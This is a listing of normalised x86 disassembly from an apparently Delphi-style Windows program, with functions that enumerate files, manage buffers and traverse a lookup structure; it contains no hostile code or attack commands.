mov ecx [ ebp - 0x28 ]
mov [ ecx + 0x15 ] 0x0
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4120c8
push ebp
mov ebp esp
add esp 0xfffffe24
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
lea edx [ ebp - 0x1ac ]
push edx
push rw-data
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push 0x2e
lea ecx [ ebp - 0x180 ]
push ecx
call j_sub_4c506c#2
add esp 0x8
mov [ eax ] 0x0
mov [ ebp - 0x48 ] 0x18
lea edx [ ebp - 0x180 ]
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x3c ]
mov edx [ eax ]
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x3c ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
lea ecx [ ebp - 0x1ac ]
push ecx
push esi
call FindNextFileA
test eax eax
jne r-xdata
mov [ ebp - 0x48 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0x3c ]
mov edx [ eax ]
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x3c ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
jmp r-xdata
push esi
call FindClose
mov [ ebp - 0x48 ] 0x24
mov esi [ rw-data ]
add esi 0x38
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
mov edx esi
call sub_41e604
lea ecx [ ebp - 0xc ]
inc [ ebp - 0x3c ]
mov edx [ ecx ]
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ ebx + 0x4 ] eax
dec [ ebp - 0x3c ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x4 ]
test ecx ecx
jge r-xdata
mov ecx [ ebx + 0x4 ]
mov [ ebx + 0x40 ] ecx
push 0x1a91c
call sub_4bbbac
pop ecx
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
xor eax eax
lea ecx [ ebp - 0x10 ]
mov [ ebx + 0x4 ] eax
xor eax eax
mov [ ebp - 0x48 ] 0x30
mov [ ebp - 0x10 ] eax
mov esi [ rw-data ]
inc [ ebp - 0x3c ]
add esi 0x38
mov eax [ ebx ]
xor edx edx
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x14 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x3c ]
inc [ ebp - 0x3c ]
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_4d2758
dec [ ebp - 0x3c ]
dec [ ebp - 0x3c ]
lea eax [ ebp - 0x14 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x3c ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
mov esi [ ebp - 0x18 ]
mov [ ebp - 0x48 ] 0x54
mov edx [ ebp - 0x18 ]
push edx
call sub_40f9e0
pop ecx
mov [ ebp - 0x48 ] 0x3c
mov esi [ ebp - 0x18 ]
jmp r-xdata
mov [ ebp - 0x48 ] 0x84
xor ecx ecx
mov [ ebp - 0x6c ] ecx
lea edx [ ebp - 0x2c ]
lea eax [ ebp - 0x34 ]
call sub_4d3050
inc [ ebp - 0x3c ]
lea eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x6c ]
mov [ ebp - 0x30 ] ecx
inc [ ebp - 0x3c ]
push eax
add esp 0xfffffff0
mov edx [ ebp - 0x1bc ]
lea eax [ ebp - 0x1dc ]
mov [ esp ] edx
mov edx [ ebp - 0x1b8 ]
mov [ esp + 0x4 ] edx
mov ecx [ ebp - 0x1b4 ]
mov [ esp + 0x8 ] ecx
push esi
push eax
call sub_4124cc
add esp 0x1c
lea edi [ ebp - 0x1bc ]
mov ecx 0x4
lea eax [ ebp - 0x34 ]
push esi
lea esi [ ebp - 0x1dc ]
[ edi ] [ esi ]
pop esi
mov edx 0x2
dec [ ebp - 0x3c ]
dec [ ebp - 0x3c ]
call sub_4d318c
mov [ ebp - 0x48 ] 0x78
mov edx [ ebp - 0x1b4 ]
mov [ ebp - 0x64 ] edx
mov ecx [ ebp - 0x64 ]
add ecx 0xc
mov [ ebp - 0x68 ] ecx
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x68 ]
call sub_4d327c
test al al
je r-xdata
mov [ ebx + 0x8 ] esi
push esi
call sub_40fb50
pop ecx
xor eax eax
mov [ ebp - 0x48 ] 0x60
mov [ ebp - 0x24 ] eax
xor eax eax
inc [ ebp - 0x3c ]
inc [ ebp - 0x3c ]
mov [ ebp - 0x1c ] eax
inc [ ebp - 0x3c ]
mov edi [ rw-data ]
inc [ ebp - 0x3c ]
mov edx edi
add edx 0x38
mov eax edi
add eax 0x4
lea ecx [ ebp - 0x1c ]
lea esi [ ebp - 0x24 ]
call sub_402e08
mov edx rw-data
lea eax [ ebp - 0x20 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x3c ]
inc [ ebp - 0x3c ]
xor eax eax
mov [ ebp - 0x48 ] 0x6c
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
inc [ ebp - 0x3c ]
inc [ ebp - 0x3c ]
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_4d278c
lea edx [ ebp - 0x28 ]
mov eax esi
call sub_4d2758
dec [ ebp - 0x3c ]
dec [ ebp - 0x3c ]
lea eax [ ebp - 0x28 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0x48 ] 0x60
lea ecx [ ebp - 0x24 ]
mov eax [ ecx ]
push eax
mov edx [ ebx + 0x8 ]
push edx
call sub_40fc08
add esp 0x8
dec [ ebp - 0x3c ]
dec [ ebp - 0x3c ]
lea eax [ ebp - 0x24 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x3c ]
dec [ ebp - 0x3c ]
lea eax [ ebp - 0x20 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x3c ]
dec [ ebp - 0x3c ]
lea eax [ ebp - 0x1c ]
xor edx edx
call sub_4d2728
mov [ ebp - 0x48 ] 0x78
mov edi [ rw-data ]
add edi 0x38
xor eax eax
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x2c ]
mov edx edi
call sub_41e604
inc [ ebp - 0x3c ]
lea eax [ ebp - 0x2c ]
push eax
lea esi [ ebx + 0x10 ]
push esi
call sub_412480
add esp 0x8
mov [ ebp - 0x5c ] eax
mov edx [ ebp - 0x5c ]
mov [ ebp - 0x1b4 ] edx
mov ecx [ esi + 0x28 ]
mov [ ebp - 0x60 ] ecx
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x1c4 ] eax
mov edx [ ebp - 0x1c4 ]
mov ecx [ ebp - 0x1b4 ]
cmp edx ecx
sete al
and eax 0x1
test al al
jne r-xdata
mov ecx [ ebp - 0x1b4 ]
mov eax [ ebx + 0x8 ]
add ecx 0x10
mov edx 0x2
mov [ ecx ] eax
lea eax [ ebp - 0x2c ]
dec [ ebp - 0x3c ]
call sub_4d318c
call sub_40e96c
mov ecx [ ebp - 0x58 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412480
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x28 ]
mov ebx [ edx + 0x4 ]
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov cl [ ebx + 0x15 ]
test cl cl
je r-xdata
mov esi [ ebp + 0xc ]
mov edi ebx
add edi 0xc
mov [ ebp - 0x8 ] edi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4d327c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov [ ebp - 0x4 ] ebx
mov ebx [ ebx ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
sub_4124cc
push ebp
mov ebp esp
add esp 0xfffffee0
xor eax eax
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0xa0 ] eax
mov edx [ esi + 0x2c ]
test edx edx
jne r-xdata
mov edx [ esi + 0x28 ]
mov eax [ edx ]
mov [ ebp - 0xe0 ] eax
mov ecx [ ebp - 0xe0 ]
mov eax [ ebp + 0x18 ]
cmp ecx eax
sete dl
and edx 0x1
test dl dl
je r-xdata
push edi
mov ecx [ esi + 0x28 ]
push ecx
push 0x1
push esi
push ebx
call sub_415638
add esp 0x14
mov eax ebx
jmp r-xdata
mov eax [ esi + 0x28 ]
mov [ ebp - 0xf0 ] eax
mov edx [ ebp - 0xf0 ]
mov ecx [ ebp + 0x18 ]
cmp edx ecx
sete al
and eax 0x1
test al al
je r-xdata
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x50 ] ecx
mov eax [ ebp - 0x50 ]
add eax 0xc
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x58 ] edi
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x58 ]
call sub_4d327c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x68 ] edx
mov ecx [ ebp - 0x68 ]
add ecx 0xc
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x70 ] edi
mov edx [ ebp - 0x6c ]
mov eax [ ebp - 0x70 ]
call sub_4d327c
test al al
je r-xdata
mov [ ebp - 0x5c ] edi
mov edx [ esi + 0x28 ]
mov ecx [ edx + 0x8 ]
mov [ ebp - 0x60 ] ecx
mov eax [ ebp - 0x60 ]
add eax 0xc
mov [ ebp - 0x64 ] eax
mov edx [ ebp - 0x5c ]
mov eax [ ebp - 0x64 ]
call sub_4d327c
test al al
je r-xdata
push edi
push esi
lea edx [ ebp - 0x120 ]
push edx
call sub_41666c
add esp 0xc
mov ecx [ ebp - 0x120 ]
mov [ ebx ] ecx
mov ecx [ ebp - 0x11c ]
mov [ ebx + 0x4 ] ecx
mov eax [ ebp - 0x118 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
push edi
mov edx [ ebp + 0x18 ]
push edx
push 0x1
push esi
push ebx
call sub_415638
add esp 0x14
mov eax ebx
jmp r-xdata
mov [ ebp - 0x80 ] edi
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x84 ] edx
mov ecx [ ebp - 0x84 ]
add ecx 0xc
mov [ ebp - 0x88 ] ecx
mov edx [ ebp - 0x80 ]
mov eax [ ebp - 0x88 ]
call sub_4d327c
test al al
je r-xdata
mov [ ebp - 0x74 ] edi
push esi
push edi
lea esi [ ebp + 0x10 ]
lea edi [ ebp - 0xa8 ]
mov ecx 0x4
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0xa8 ]
push eax
call sub_41660c
pop ecx
mov edx [ ebp - 0xa0 ]
mov [ ebp - 0x78 ] edx
mov ecx [ ebp - 0x78 ]
add ecx 0xc
mov [ ebp - 0x7c ] ecx
mov edx [ ebp - 0x74 ]
mov eax [ ebp - 0x7c ]
call sub_4d327c
test al al
je r-xdata
push edi
mov edx [ esi + 0x28 ]
mov ecx [ edx + 0x8 ]
push ecx
push 0x0
push esi
push ebx
call sub_415638
add esp 0x14
mov eax ebx
jmp r-xdata
mov ecx [ esi + 0x28 ]
mov [ ebp - 0x8c ] ecx
mov ecx 0x4
mov eax [ ebp - 0x8c ]
mov [ ebp - 0x100 ] eax
push esi
push edi
lea edi [ ebp - 0xa8 ]
lea esi [ ebp + 0x10 ]
lea eax [ ebp - 0xa8 ]
[ edi ] [ esi ]
pop edi
pop esi
push eax
call sub_408004
pop ecx
mov edx [ ebp - 0xa0 ]
mov ecx [ ebp - 0x100 ]
cmp edx ecx
sete al
and eax 0x1
test al al
jne r-xdata
mov ecx [ ebp - 0xa0 ]
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov ecx [ ebp + 0x18 ]
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov edx [ ebp - 0xa0 ]
mov [ ebp - 0x90 ] edx
mov ecx [ ebp - 0x90 ]
add ecx 0xc
mov [ ebp - 0x94 ] ecx
mov [ ebp - 0x98 ] edi
mov edx [ ebp - 0x94 ]
mov eax [ ebp - 0x98 ]
call sub_4d327c
test al al
je r-xdata
push edi
mov edx [ ebp + 0x18 ]
push edx
push 0x1
push esi
push ebx
call sub_415638
add esp 0x14
mov eax ebx
jmp r-xdata
push edi
mov ecx [ ebp - 0xa0 ]
push ecx
push 0x0
push esi
push ebx
call sub_415638
add esp 0x14
mov eax ebx
jmp r-xdata
push edi
mov edx [ ebp - 0xa0 ]
push edx
push 0x1
push esi
push ebx
call sub_415638
add esp 0x14
mov eax ebx
jmp r-xdata
push edi
mov ecx [ ebp + 0x18 ]
push ecx
push 0x0
push esi
push ebx
call sub_415638
add esp 0x14
mov eax ebx
jmp r-xdata
sub_41250c
mov edx [ esi + 0x28 ]
mov eax [ edx ]
mov [ ebp - 0xb0 ] eax
mov ecx [ ebp - 0xb0 ]
mov eax [ ebp + 0x18 ]
cmp ecx eax
sete dl
and edx 0x1
test dl dl
je r-xdata
mov eax [ esi + 0x28 ]
mov [ ebp - 0xc0 ] eax
mov edx [ ebp - 0xc0 ]
mov ecx [ ebp + 0x18 ]
cmp edx ecx
sete al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
add eax 0xc
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_4d327c
test al al
jne r-xdata
mov [ ebp - 0x1c ] edi
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0x20 ]
add ecx 0xc
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x24 ]
call sub_4d327c
test al al
jne r-xdata
mov edx [ esi + 0x28 ]
mov ecx [ edx + 0x8 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
add eax 0xc
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4d327c
test al al
jne r-xdata
push edi
push esi
lea edx [ ebp - 0x120 ]
push edx
call sub_41666c
add esp 0xc
mov ecx [ ebp - 0x120 ]
mov [ ebx ] ecx
mov ecx [ ebp - 0x11c ]
mov [ ebx + 0x4 ] ecx
mov eax [ ebp - 0x118 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
push edi
mov edx [ ebp + 0x18 ]
push edx
push 0x1
push esi
push ebx
call sub_415638
add esp 0x14
mov eax ebx
jmp r-xdata
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x34 ] edx
mov ecx [ ebp - 0x34 ]
add ecx 0xc
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x3c ] edi
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x3c ]
call sub_4d327c
test al al
jne r-xdata
push esi
push edi
lea edi [ ebp - 0xa8 ]
lea esi [ ebp + 0x10 ]
mov ecx 0x4
lea eax [ ebp - 0xa8 ]
[ edi ] [ esi ]
pop edi
pop esi
push eax
call sub_41660c
pop ecx
mov edx [ ebp - 0xa0 ]
mov [ ebp - 0x28 ] edx
mov ecx [ ebp - 0x28 ]
add ecx 0xc
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] edi
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x30 ]
call sub_4d327c
test al al
jne r-xdata
push edi
mov edx [ esi + 0x28 ]
mov ecx [ edx + 0x8 ]
push ecx
push 0x0
push esi
push ebx
call sub_415638
add esp 0x14
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x28 ]
mov [ ebp - 0x40 ] ecx
mov ecx 0x4
mov eax [ ebp - 0x40 ]
mov [ ebp - 0xd0 ] eax
push esi
push edi
lea edi [ ebp - 0xa8 ]
lea esi [ ebp + 0x10 ]
lea eax [ ebp - 0xa8 ]
[ edi ] [ esi ]
pop edi
pop esi
push eax
call sub_408004
pop ecx
mov edx [ ebp - 0xa0 ]
mov ecx [ ebp - 0xd0 ]
cmp edx ecx
sete al
and eax 0x1
test al al
jne r-xdata
mov ecx [ ebp - 0xa0 ]
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov ecx [ ebp + 0x18 ]
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov [ ebp - 0x44 ] edi
mov edx [ ebp - 0xa0 ]
mov [ ebp - 0x48 ] edx
mov ecx [ ebp - 0x48 ]
add ecx 0xc
mov [ ebp - 0x4c ] ecx
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4c ]
call sub_4d327c
test al al
jne r-xdata
push edi
mov edx [ ebp + 0x18 ]
push edx
push 0x1
push esi
push ebx
call sub_415638
add esp 0x14
mov eax ebx
jmp r-xdata
push edi
mov ecx [ ebp - 0xa0 ]
push ecx
push 0x0
push esi
push ebx
call sub_415638
add esp 0x14
mov eax ebx
jmp r-xdata
push edi
mov edx [ ebp - 0xa0 ]
push edx
push 0x1
push esi
push ebx
call sub_415638
add esp 0x14
mov eax ebx
jmp r-xdata
push edi
mov ecx [ ebp + 0x18 ]
push ecx
push 0x0
push esi
push ebx
call sub_415638
add esp 0x14
mov eax ebx
jmp r-xdata
sub_412a00
push ebp
mov ebp esp
add esp 0xffffff8c
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov [ ebp - 0x28 ] 0x2
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
mov edx [ ebp - 0x44 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x34 ] 0xc
mov [ ebp - 0x34 ] 0x18
mov ebx [ rw-data ]
xor eax eax
mov [ ebp - 0x4 ] eax
add ebx 0x38
inc [ ebp - 0x28 ]
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ eax ]
mov edx [ edx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x28 ]
inc [ ebp - 0x28 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4d2758
dec [ ebp - 0x28 ]
dec [ ebp - 0x28 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x28 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx + 0x8 ]
mov al [ ebx ]
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x38 ]
mov eax [ eax ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x34 ] 0xc
jmp r-xdata
mov [ ebp - 0x34 ] 0x24
mov edx rw-data
lea eax [ ebp - 0x10 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x28 ]
inc [ ebp - 0x28 ]
lea edx [ ebp - 0x10 ]
push edx
xor eax eax
mov [ ebp - 0xc ] eax
inc [ ebp - 0x28 ]
lea ecx [ ebp - 0xc ]
inc [ ebp - 0x28 ]
mov esi [ rw-data ]
mov edx esi
add edx 0x38
mov eax esi
add eax 0x4
call sub_402e08
lea eax [ ebp - 0xc ]
xor edx edx
mov [ ebp - 0x14 ] edx
inc [ ebp - 0x28 ]
lea ecx [ ebp - 0x14 ]
inc [ ebp - 0x28 ]
pop edx
call sub_402e08
lea eax [ ebp - 0x14 ]
mov ecx [ eax ]
push ecx
push ebx
call sub_410ee8
add esp 0x8
dec [ ebp - 0x28 ]
dec [ ebp - 0x28 ]
lea eax [ ebp - 0x14 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x28 ]
dec [ ebp - 0x28 ]
lea eax [ ebp - 0x10 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x28 ]
dec [ ebp - 0x28 ]
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4d2728
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x38 ]
mov edx eax
mov [ ebp - 0x5c ] edx
mov ecx [ ebp - 0x4c ]
cmp edx ecx
setne al
and eax 0x1
test al al
jne r-xdata
mov eax [ ecx + 0x10 ]
mov [ ebp - 0x34 ] 0xc
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x18 ]
test edx edx
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ edx ]
mov [ ebp - 0x20 ] ebx
test ebx ebx
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_408004
pop ecx
mov [ ebp - 0x34 ] 0x48
push 0x3
mov ecx [ ebp - 0x18 ]
push ecx
call sub_40fae8
mov [ ebp - 0x34 ] 0x30
add esp 0x8
dec [ ebp - 0x28 ]
mov ebx [ ebp + 0x8 ]
add ebx 0x10
dec [ ebp - 0x28 ]
add esp 0xfffffff0
mov edi [ ebx + 0x28 ]
mov esi edi
mov [ esp + 0x8 ] esi
add esp 0xfffffff0
mov eax [ edi ]
mov [ esp + 0x8 ] eax
push ebx
lea eax [ ebp - 0x74 ]
push eax
call sub_406b64
add esp 0x28
mov eax [ ebx + 0x28 ]
push eax
call sub_4b0180
pop ecx
xor edx edx
mov [ ebx + 0x28 ] edx
xor ecx ecx
mov [ ebx + 0x2c ] ecx
mov [ ebp - 0x34 ] 0xc
test [ ebp + 0xc ] 0x1
je r-xdata
mov eax [ ebx ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x34 ] 0x6c
mov edx 0x3
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x34 ] 0x54
mov eax [ ebp + 0x8 ]
push eax
call sub_4b0180
pop ecx
sub_412c58
push ebp
mov ebp esp
add esp 0xfffffed0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
mov edx [ ebx + 0x4 ]
cmp esi edx
jne r-xdata
mov [ ebp - 0x6c ] 0xc
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
inc [ ebp - 0x60 ]
mov edx esi
mov eax [ ebx ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebp - 0x4 ]
xor eax eax
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x8 ]
inc [ ebp - 0x60 ]
mov eax rw-data
call sub_4d3564
lea edx [ ebp - 0x8 ]
push edx
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x60 ]
xor eax eax
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0xc ]
inc [ ebp - 0x60 ]
lea ecx [ ebp - 0x10 ]
pop eax
call sub_4d31c8
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x14 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x60 ]
lea edx [ ebp - 0x14 ]
inc [ ebp - 0x60 ]
mov eax [ edx ]
push eax
push rw-data
push 0x64
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x60 ]
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x14 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x60 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x8 ]
test ecx ecx
je r-xdata
xor eax eax
mov edx [ ebp - 0x7c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov [ ebp - 0x6c ] 0x30
xor eax eax
mov [ ebp - 0x2c ] eax
lea ecx [ ebp - 0x2c ]
inc [ ebp - 0x60 ]
mov edx esi
mov eax [ ebx ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edi [ ebx + 0x10 ]
lea eax [ ebp - 0x2c ]
push eax
push edi
call sub_412480
add esp 0x8
mov [ ebp - 0x80 ] eax
mov edx [ ebp - 0x80 ]
mov [ ebp - 0xc8 ] edx
mov ecx [ edi + 0x28 ]
mov [ ebp - 0x88 ] ecx
mov eax [ ebp - 0x88 ]
mov [ ebp - 0xd8 ] eax
mov edx [ ebp - 0xd8 ]
mov ecx [ ebp - 0xc8 ]
cmp edx ecx
sete al
and eax 0x1
test al al
jne r-xdata
mov eax [ ebx + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x28 ]
lea edx [ ebp - 0xf0 ]
mov [ ebp - 0x94 ] ecx
mov eax [ ebp - 0x94 ]
mov [ ebp - 0xe8 ] eax
jmp r-xdata
mov edx [ ebp - 0xc8 ]
mov [ ebp - 0x8c ] edx
mov ecx [ ebp - 0x8c ]
add ecx 0xc
mov [ ebp - 0x90 ] ecx
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x90 ]
call sub_4d327c
test al al
je r-xdata
xor edi edi
mov [ ebp - 0x6c ] 0x18
xor ecx ecx
mov [ ebp - 0x18 ] ecx
lea ecx [ ebp - 0x18 ]
inc [ ebp - 0x60 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x60 ]
inc [ ebp - 0x60 ]
lea edx [ ebp - 0x1c ]
xor eax eax
mov [ ebp - 0x20 ] eax
inc [ ebp - 0x60 ]
lea ecx [ ebp - 0x20 ]
inc [ ebp - 0x60 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push edx
mov edx rw-data
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x60 ]
inc [ ebp - 0x60 ]
xor eax eax
mov [ ebp - 0x28 ] eax
lea edx [ ebp - 0x24 ]
inc [ ebp - 0x60 ]
inc [ ebp - 0x60 ]
lea ecx [ ebp - 0x28 ]
pop eax
call sub_402e08
lea edx [ ebp - 0x28 ]
mov ecx [ edx ]
push ecx
mov eax [ ebx + 0x8 ]
push eax
call sub_410ee8
add esp 0x8
dec [ ebp - 0x60 ]
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x28 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x60 ]
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x24 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x60 ]
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x20 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x60 ]
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x1c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x84 ] edx
mov eax [ ebp - 0x84 ]
mov ecx [ eax ]
mov [ ebp - 0xc0 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0xbc ] ecx
mov eax [ ebp - 0x84 ]
mov edx [ eax + 0x8 ]
lea eax [ ebp - 0x2c ]
mov [ ebp - 0xb8 ] edx
mov edx 0x2
dec [ ebp - 0x60 ]
call sub_4d318c
mov [ ebp - 0x6c ] 0x24
mov eax [ ebx + 0x38 ]
mov edx eax
mov [ ebp - 0xf8 ] edx
mov edi [ ebp - 0xb8 ]
cmp edx edi
setne al
and eax 0x1
test al al
je r-xdata
lea edx [ ebp - 0xd0 ]
imul eax edi 0x1a90
mov edx [ ebx + 0x8 ]
add eax edx
add eax 0x8
push eax
call sub_40fbb8
pop ecx
inc edi
cmp edi 0x10
jl r-xdata
mov ecx [ rw-data ]
push ecx
call sub_411e30
pop ecx
push 0x1a91c
call sub_4bbbac
pop ecx
mov [ ebp - 0x30 ] eax
test eax eax
je r-xdata
mov edx [ edi + 0x10 ]
mov [ ebx + 0x8 ] edx
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x6c ] 0x54
mov edx [ ebp - 0x30 ]
push edx
call sub_40f9e0
pop ecx
mov [ ebp - 0x6c ] 0x3c
mov ecx [ ebp - 0x30 ]
jmp r-xdata
mov ecx [ rw-data ]
xor eax eax
add ecx 0x38
mov edx esi
mov [ ebp - 0xb0 ] ecx
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x6c ] 0x90
mov [ ebp - 0x54 ] eax
inc [ ebp - 0x60 ]
mov eax [ ebx ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebp - 0x54 ]
lea eax [ ebp - 0x58 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x60 ]
inc [ ebp - 0x60 ]
lea edx [ ebp - 0x58 ]
